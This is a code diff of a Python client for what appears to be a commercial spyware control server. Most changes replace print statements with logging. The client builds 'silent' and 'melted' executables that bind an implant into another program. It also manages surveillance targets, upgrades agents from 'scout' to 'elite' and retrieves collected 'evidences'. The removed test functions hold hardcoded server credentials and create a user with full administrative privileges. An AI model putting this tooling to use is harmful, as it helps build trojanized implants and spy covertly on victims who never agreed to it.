@@ -2,11 +2,11 @@ import urllib2
 from urllib2 import HTTPError
 import cookielib
 import json
-import pprint
+import logging
 import traceback
 from time import sleep
 
-pp = pprint.PrettyPrinter(indent=4)
+#pp = pprint.PrettyPrinter(indent=4)
 
 
 class Rcs_client:
@@ -34,7 +34,7 @@ class Rcs_client:
             sleep(1)
             return resp
         except HTTPError as e:
-            print "ERROR: processing %s: %s, %s" % (link, e, e.read())
+            logging.error("ERROR: processing %s: %s, %s" % (link, e, e.read()))
             raise e
 
     def _post_response(self, link, cj, data=None):
@@ -52,12 +52,12 @@ class Rcs_client:
             sleep(1)
             return resp
         except HTTPError as e:
-            print "ERROR: processing %s: %s, %s" % (link, e, e.read())
+            logging.error("ERROR: processing %s: %s, %s" % (link, e, e.read()))
             raise e
 
     def _call(self, api_name, data={}, binary=False, argjson=True):
         link = 'https://%s/%s' % (self.host, api_name)
-        # print "binary %s, argjson %s" % (binary, argjson)
+        # logging.debug("binary %s, argjson %s" % (binary, argjson))
         arg = data
         if argjson:
             arg = json.dumps(data)
@@ -70,9 +70,9 @@ class Rcs_client:
             result = json.loads(resp)
             return result
         except Exception, e:
-            print "ERROR: %s" % e
-            print "DBG trace %s" % traceback.format_exc()
-            print "call error: %s" % resp
+            logging.error("ERROR: %s" % e)
+            logging.debug("DBG trace %s" % traceback.format_exc())
+            logging.debug("call error: %s" % resp)
             raise e
 
     def _call_get(self, api_name):
@@ -96,9 +96,9 @@ class Rcs_client:
         cj = cookielib.CookieJar()
         resp = self._post_response(link, cj, data)
         result = json.loads(resp)
-        # print result
+        # logging.debug(result)
         self.myid = result['user']['_id']
-        # print "my id = %s" % self.myid
+        # logging.debug("my id = %s" % self.myid)
 
         self.cookie = cj
         return cj
@@ -118,7 +118,7 @@ class Rcs_client:
     def operation(self, operation):
         """ gets the operation id of an operation """
         operations = self._call_get('operation')
-        print "DBG operation: %s" % operations
+        logging.debug("DBG operation: %s" % operations)
         ret = [(op['_id'], op['group_ids'])
                for op in operations if op['name'] == operation]
         return ret[0] if ret else None
@@ -174,7 +174,7 @@ class Rcs_client:
         except HTTPError as e:
             if e.code == 409:
                 return True
-            print e
+            logging.error(e)
             return False
 
     def target_delete(self, target_id):
@@ -217,18 +217,18 @@ class Rcs_client:
                     break
             if not fct:
                 return False
-            # print fct
+            # logging.debug(fct)
             addlink = '%s/agent/add_config' % base
             f = open(conf_file, 'r')
             cnf = f.read()
             data = {'_id': fct["_id"], 'config': cnf}
-            # print data
+            # logging.debug(data)
             resp = self._post_response(addlink, self.cookie, json.dumps(data))
 
             return True
         except Exception as e:
-            print "DBG trace %s" % traceback.format_exc()
-            print e
+            logging.debug("DBG trace %s" % traceback.format_exc())
+            logging.error(e)
             return False
 
     def instance_upgrade(self, instance_id):
@@ -255,7 +255,7 @@ class Rcs_client:
         """
         data = {'_id': instance_id, 'permanent': True}
         return self._call('agent/destroy', data)
-        # print resp
+        # logging.debug(resp)
 
     def evidences(self, target, agent, type):
         """ Get evidences of given agent and target
@@ -265,11 +265,11 @@ class Rcs_client:
         """
         f = {"type": "['']", "target": target, "agent": agent[1]}
         filter = json.dumps(f)
-        # print urllib.quote(filter)
+        # logging.debug(urllib.quote(filter))
         link = 'https://%s/evidence?filter=%s' % (self.host, filter)
         resp = self._get_response(link, self.cookie)
 
-        print resp
+        logging.debug(resp)
 
     def build(self, factory, params, out_file):
         """ Build Silent Exe
@@ -279,14 +279,14 @@ class Rcs_client:
         """
 
         params['factory'] = {"_id": "%s" % factory}
-        # print "+ Build params: \n%s" % params
+        # logging.debug("+ Build params: \n%s" % params)
 
         resp = self._call('build', params, binary=True)
 
         out = open(out_file, 'wb')
         out.write(resp)
 
-        # print "+ %s bytes saved to %s" % (len(out),  out_file)
+        # logging.debug("+ %s bytes saved to %s" % (len(out),  out_file))
 
     def build_melt(self, factory, params, melt_file, out_file):
         """ Build Melted Exe
@@ -299,14 +299,14 @@ class Rcs_client:
 
         f = open(melt_file, "rb")
         payload = f.read()
-        print "DBG payload size: ", len(payload), " file: ", melt_file
+        logging.debug("DBG payload size: %s file:  %s" %( len(payload), melt_file))
         melt_id = self._call('upload', payload, binary=True, argjson=False)
-        print "DBG uploaded: ", melt_id
+        logging.debug("DBG uploaded:  %s" % melt_id)
 
         params['melt']['input'] = melt_id
         #:  Build: melting: {"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true, "input"=>"4f60909baef1de0e4800000a-1361192221.897401094"}
 
-        print "DBG Build melt params: \n%s" % params
+        logging.debug("DBG Build melt params: \n%s" % params)
         #link  = 'https://%s/build' % self.host
         #resp = self.post_response(link, json.dumps(params))
         resp = self._call('build', params,  binary=True)
@@ -315,130 +315,3 @@ class Rcs_client:
         out.write(resp)
 
 
-def testMelt():
-    print 'test'
-    host = "rcs-minotauro"
-    user = "avmonitor"
-    passwd = "avmonitorp123"
-    conn = Rcs_client(host, user, passwd)
-    print conn.login()
-
-    if(False):
-        operation, target, factory = '51222810aef1de0f040003f9', '51222b77aef1de0f040005d0', '51222b79aef1de0f040005d4'
-        config = open('assets/config.json').read()
-        conn.factory_add_config(factory, config)
-
-    else:
-        operation = conn.operation('AVMonitor')
-        targets = conn.targets(operation, "Mazurca")
-
-        for t in targets:
-            print "delete target: ", t
-            conn.target_delete(t)
-
-        print "remained targets: ", conn.targets(operation, "Mazurca")
-
-        target = conn.target_create(operation, 'Mazurca', 'la mia musica')
-        factory = conn.factory_create(
-            operation, target, 'desktop', 'Bella fattoria', 'degli animali')
-        print "factory: ", factory
-        # sleep(10)
-
-        config = open('assets/config.json').read()
-        conn.factory_add_config(factory, config)
-
-        print "targets: ", targets
-
-    param = {'platform': 'windows',
-             'binary': {'demo': False, 'admin': False},
-             'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
-             'sign': {}
-             }
-
-    #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
-    try:
-        #r = conn.build(factory, param, 'build.out')
-        print "build"
-        r = conn.build_melt(factory, param, 'assets/meltapp.exe', 'build.out')
-
-    except Exception, e:
-        print "DBG trace %s" % traceback.format_exc()
-        print e
-
-    r = conn.enum_instances(factory)
-    print "instances: ", r
-
-    # sleep(5)
-    conn.target_delete(target)
-    print "'%s','%s','%s' " % (operation, target, factory)
-    print conn.logout()
-
-
-def test():
-    import socket
-    import time
-
-    print 'test'
-    host = "rcs-minotauro"
-    user = "avmonitor"
-    passwd = "avmonitorp123"
-    conn = Rcs_client(host, user, passwd)
-    print conn.login()
-
-    print conn.server_status()
-
-    hostname = socket.gethostname()
-    print "%s %s\n" % (hostname, time.ctime())
-    target = 'VM_%s' % hostname
-
-    operation_id, group_id = conn.operation('AVMonitor')
-    print group_id
-    privs = [
-        'ADMIN', 'ADMIN_USERS', 'ADMIN_OPERATIONS', 'ADMIN_TARGETS', 'ADMIN_AUDIT', 'ADMIN_LICENSE', 'SYS', 'SYS_FRONTEND', 'SYS_BACKEND', 'SYS_BACKUP', 'SYS_INJECTORS', 'SYS_CONNECTORS', 'TECH',
-        'TECH_FACTORIES', 'TECH_BUILD', 'TECH_CONFIG', 'TECH_EXEC', 'TECH_UPLOAD', 'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM', 'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']
-
-    user_id = conn.user_create("avmonitor_zeno", passwd, privs, group_id)
-    user = "avmonitor_zeno"
-    print "user_id: ", user_id
-    conn.logout()
-
-    # login with new user
-    conn = Rcs_client(host, user, passwd)
-    print conn.login()
-
-    # exit(0)
-
-    t_id = conn.target_create(operation_id, target, "Dammy")
-    print "t_id: ", t_id
-
-    targets = conn.targets(operation_id, target)
-    for target_id in targets:
-        print "targets: ", targets
-
-        factories = conn.factories(target_id)
-        print "factories: ", factories
-
-        for factory_id, ident in factories:
-            print "factory_id ", factory_id, ident
-            instances = conn.instances(ident)
-            print "instances: ", instances
-
-            for instance_id in instances:
-                print "info %s" % instance_id
-                info = conn.instance_info(instance_id)
-                print info
-                assert info['scout'] is True
-
-                print "upgrade elite"
-                res = conn.instance_upgrade(instance_id)
-                print "res: %s" % res
-
-                info = conn.instance_info(instance_id)
-                print info
-                if res:
-                    assert info['upgradable'] is True
-
-if __name__ == "__main__":
-    import logger
-    logger.setLogger(debug=True)
-    test()
